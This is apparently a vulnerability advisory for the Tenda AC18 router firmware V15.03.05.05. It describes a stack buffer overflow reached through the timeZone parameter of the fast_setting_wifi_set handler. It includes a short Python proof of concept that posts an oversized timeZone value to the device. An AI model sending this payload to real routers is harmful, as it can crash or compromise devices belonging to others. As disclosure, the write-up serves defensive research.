## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `form_fast_setting_wifi_set` function. The `v1` variable receives the `timeZone` parameter from a POST request and is later assigned to the `v16` variable. Then v16 is assigned to `nptr` and `v7` by `sscanf`. However, since the user can control the input of  `timeZone`, the statement `sprintf(v9, "%d", v21);` can cause a buffer overflow. The user-provided  `timeZone` can exceed the capacity of the `v9` array, triggering this security vulnerability.

![image-20240308203733864](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308203733864.png)

![image-20240308203708294](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308203708294.png)

## POC

```python
import requests
ip = '192.168.84.101'
url = f'http://{ip}/goform/fast_setting_wifi_set'

payload = {
    # 'ssid': 'a' * 1000
    'timeZone': 'a' * 1000 + ":" + "aaa"
}

r = requests.post(url=url, data=payload)
print(r.content)
```

![image-20240305164305678](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305164305678.png)
